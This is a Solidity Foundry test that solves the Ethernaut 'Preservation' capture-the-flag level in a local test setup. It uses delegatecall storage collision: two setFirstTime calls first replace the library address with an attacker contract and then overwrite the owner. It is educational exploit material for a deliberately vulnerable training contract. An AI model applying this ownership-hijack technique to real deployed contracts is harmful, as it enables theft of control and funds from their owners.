// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { Preservation } from "src/Preservation/Preservation.sol";
import { PreservationAttack } from "src/Preservation/PreservationAttack.sol";
import { PreservationFactory } from "src/Preservation/PreservationFactory.sol";

contract PreservationAttackTest is PRBTest {
    Ethernaut public ethernaut;
    PreservationFactory public factory;
    PreservationAttack public attacker;
    address public preservationInstance;
    address public playerAddress = address(0x696969);

    function setUp() public {
        vm.startPrank(playerAddress);
        ethernaut = new Ethernaut();
        factory = new PreservationFactory();

        ethernaut.registerLevel(factory);
        preservationInstance = ethernaut.createLevelInstance(factory);
        attacker = new PreservationAttack();
        vm.stopPrank();
    }

    function testPreservationAttack() public {

        // use the delegatecall to rewrite the first state slot with our attacker address
        Preservation(preservationInstance).setFirstTime(uint256(uint160(address(attacker))));
        assert(Preservation(preservationInstance).timeZone1Library() == address(attacker));

        // now that our attacker contract is set, the next delegatecall will allow us to rewrite state variables
        Preservation(preservationInstance).setFirstTime(uint256(uint160(playerAddress)));
        assert(Preservation(preservationInstance).owner() ==playerAddress);


        vm.startPrank(playerAddress, playerAddress);
        // submit level as player
        bool levelComplete = ethernaut.submitLevelInstance(payable(preservationInstance));
        assert(levelComplete);
        vm.stopPrank();
    }
}
